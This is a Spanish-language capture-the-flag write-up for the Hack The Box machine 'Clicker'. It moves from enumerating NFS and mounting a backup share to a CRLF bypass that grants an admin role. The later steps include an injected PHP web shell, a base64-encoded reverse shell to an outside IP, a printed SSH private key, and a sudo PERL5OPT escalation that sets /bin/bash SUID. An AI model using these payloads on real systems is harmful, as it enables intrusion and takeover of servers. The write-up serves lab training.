---
redirect_from:
  - /posts/CLICKER-WriteUp/

title: "Clicker - WriteUp"
date: Mon Oct 21 2024 19:30:00 GMT+0200 (Central European Summer Time)
categories: [WriteUps, HTB, Linux]
tags: [ctf, nmap, htb, sudo, exploit, apache, php, linux, ssh, bash]
image: /assets/img/htb-writeups/Pasted-image-20240120131231.png
---

{% include machine-info.html
  machine="Clicker"
  os="Linux"
  difficulty="Medium"
  platform="HTB"
%}

![Clicker](/assets/img/htb-writeups/Pasted-image-20240120131231.png)

------

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120131231.png)

------

NMAP

```bash
# Nmap 7.94SVN scan initiated Sat Jan 20 13:19:52 2024 as: nmap -sCV -p 22,80,111,2049,38305,41531,50835,56529,56753 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oN targeted -oX targetedXML 10.129.10.191
Nmap scan report for clicker.htb (10.129.10.191)
Host is up (0.040s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
80/tcp    open  http     Apache httpd 2.4.52 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Clicker - The Game
|_http-server-header: Apache/2.4.52 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38271/tcp6  mountd
|   100005  1,2,3      53534/udp6  mountd
|   100005  1,2,3      56753/tcp   mountd
|   100005  1,2,3      60399/udp   mountd
|   100021  1,3,4      38305/tcp   nlockmgr
|   100021  1,3,4      42931/udp6  nlockmgr
|   100021  1,3,4      43319/tcp6  nlockmgr
|   100021  1,3,4      59421/udp   nlockmgr
|   100024  1          34223/tcp6  status
|   100024  1          40962/udp6  status
|   100024  1          49657/udp   status
|   100024  1          50835/tcp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
38305/tcp open  nlockmgr 1-4 (RPC #100021)
41531/tcp open  mountd   1-3 (RPC #100005)
50835/tcp open  status   1 (RPC #100024)
56529/tcp open  mountd   1-3 (RPC #100005)
56753/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

HTTP

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120132314.png)

Si pulsamos sobre info nos sale este banner de posibles usuarios:

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120132435.png)

Si nos registramos podemos jugar a un juego que cuenta clics con el ratón:

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120132826.png)

Y también guarda nuestro progreso en un perfil:

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120132908.png)

Nos llama el atención el puerto 111. Vamos a intentar enumerarlo:

```bash
$ rpcinfo clicker.htb

program version netid     address                service    owner
    100000    4    tcp6      ::.0.111               portmapper superuser
    100000    3    tcp6      ::.0.111               portmapper superuser
    100000    4    udp6      ::.0.111               portmapper superuser
    100000    3    udp6      ::.0.111               portmapper superuser
    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
    100000    3    tcp       0.0.0.0.0.111          portmapper superuser
    100000    2    tcp       0.0.0.0.0.111          portmapper superuser
    100000    4    udp       0.0.0.0.0.111          portmapper superuser
    100000    3    udp       0.0.0.0.0.111          portmapper superuser
    100000    2    udp       0.0.0.0.0.111          portmapper superuser
    100000    4    local     /run/rpcbind.sock      portmapper superuser
    100000    3    local     /run/rpcbind.sock      portmapper superuser
    100005    1    udp       0.0.0.0.143.110        mountd     superuser
    100005    1    tcp       0.0.0.0.162.59         mountd     superuser
    100005    1    udp6      ::.224.147             mountd     superuser
    100005    1    tcp6      ::.176.5               mountd     superuser
    100005    2    udp       0.0.0.0.228.242        mountd     superuser
    100005    2    tcp       0.0.0.0.220.209        mountd     superuser
    100005    2    udp6      ::.228.173             mountd     superuser
    100005    2    tcp6      ::.218.51              mountd     superuser
    100005    3    udp       0.0.0.0.235.239        mountd     superuser
    100005    3    tcp       0.0.0.0.221.177        mountd     superuser
    100005    3    udp6      ::.209.30              mountd     superuser
    100005    3    tcp6      ::.149.127             mountd     superuser
    100024    1    udp       0.0.0.0.193.249        status     116
    100024    1    tcp       0.0.0.0.198.147        status     116
    100024    1    udp6      ::.160.2               status     116
    100024    1    tcp6      ::.133.175             status     116
    100003    3    tcp       0.0.0.0.8.1            nfs        superuser
    100003    4    tcp       0.0.0.0.8.1            nfs        superuser
    100227    3    tcp       0.0.0.0.8.1            nfs_acl    superuser
    100003    3    tcp6      ::.8.1                 nfs        superuser
    100003    4    tcp6      ::.8.1                 nfs        superuser
    100227    3    tcp6      ::.8.1                 nfs_acl    superuser
    100021    1    udp       0.0.0.0.232.29         nlockmgr   superuser
    100021    3    udp       0.0.0.0.232.29         nlockmgr   superuser
    100021    4    udp       0.0.0.0.232.29         nlockmgr   superuser
    100021    1    tcp       0.0.0.0.149.161        nlockmgr   superuser
    100021    3    tcp       0.0.0.0.149.161        nlockmgr   superuser
    100021    4    tcp       0.0.0.0.149.161        nlockmgr   superuser
    100021    1    udp6      ::.167.179             nlockmgr   superuser
    100021    3    udp6      ::.167.179             nlockmgr   superuser
    100021    4    udp6      ::.167.179             nlockmgr   superuser
    100021    1    tcp6      ::.169.55              nlockmgr   superuser
    100021    3    tcp6      ::.169.55              nlockmgr   superuser
    100021    4    tcp6      ::.169.55              nlockmgr   superuser
```

```bash
$ showmount -e 10.129.10.191
Export list for 10.129.10.191:
/mnt/backups *
```

Encontramos una ruta llamada "backups". Vamos a intentar montarla en nuestro equipo:

```bash
sudo mkdir /mnt/clicker
sudo mount -t nfs -o vers=3 10.129.10.191:/mnt/backups /mnt/clicker -o nolock
```

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120134156.png)

Nos copiamos el archivo .zip a nuestra ruta de trabajo e intentamos descomprimirla.

```bash
$ cp clicker.htb_backup.zip /home/andy/HTB/Clicker/content
```

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120134345.png)

Parece que tenemos una copia de seguridad de la web. Vamos a investigar un poco en los archivos.

En el archivo "save_game.php" nos llama la atención un comentario que dejó el desarrollador:

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120140049.png)

Vamos a capturar con _BurpSuite_ esta petición y a ver qué podemos hacer.

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120140349.png)

Tenemos por una parte el parámetro "clicks" y por otra el parámetro "level". Vamos a intentar modificarlo y ver si salta el aviso del código en PHP.

Si modificamos "level" nos deja hacerlo sin problema:

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120140634.png)

De hecho nos lo refleja en nuestro profile:

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120140730.png)

Hablando de profiles... Si volvemos al archivo PHP vemos que existe un parámetro llamado "role":

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120141213.png)

Vamos a intentar incluirlo en nuestra petición poniéndole como valor "admin".

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120142056.png)

Y obtenemos la respuesta que esperábamos:

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120142135.png)

Está claro que es por aquí por donde podemos entrarle, ahora hay que investigar un poco para saber cómo hacerlo.
Encontramos información en la página HackTricks https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a y haciendo pruebas, encontramos la forma de hacer bypass a la protección, ya que no está contemplado el retorno de carro "/n" en este caso lo representamos como "%0a".

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120142638.png)

Y esta vez sí se lo ha tragado.

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120142718.png)

Nos deslogueamos y volvemos a entrar. Esta vez nos salen nuevas opciones:

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120151351.png)

Tenemos acceso a admin.php con posibilidad de exportarlo a diferentes formatos, txt, jason y html.

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120151435.png)

Pulsamos sobre "Export" y nos devuelve el siguiente mensaje:

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120151802.png)

Vamos a la ruta donde se ha exportado el archivo de texto y vemos lo siguiente:

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120151953.png)

No vemos nada que nos pueda ayudar por ahora. 

En el código de "export.php" vemos que contempla la exportación en txt y json si no lo exporta con mucha más información.

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120152844.png)

Vamos a volver a capturar la ejecución de "Export" para ver qué hace si le ponemos otra extensión que no esté contemplada, por ejemplo la última opción que es .html

Hacemos el proceso y nos lleva a una página html con la misma información prácticamente...

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120153632.png)

Creo que es un rabbit hole, sigamos investigando los archivos .php

```
&nickname=<%3fphp+system($_GET['cmd'])+%3f>
```

Exportar como PHP

```bash
$ echo "sh -i >& /dev/tcp/10.10.14.49/4444 0>&1" | base64
```

```http 
http://clicker.htb/exports/top_players_7pn1q9b2.php?cmd=echo%20%22c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDkvNDQ0NCAwPiYxCg==%22%20|%20base64%20-d%20|%20bash
```

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120155453.png)

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120155737.png)

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```bash
$ chmod 600 id_rsa
$ ssh -i id_rsa jack@10.129.10.191
```

![CLICKER](/assets/img/htb-writeups/Pasted-image-20240120161405.png)

Y entramos como Jack. Registramos bandera y continuamos.

https://www.exploit-db.com/exploits/39702
```bash
$ sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh
$ bash -p
```
---

**Última actualización**: 2024-10-21<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
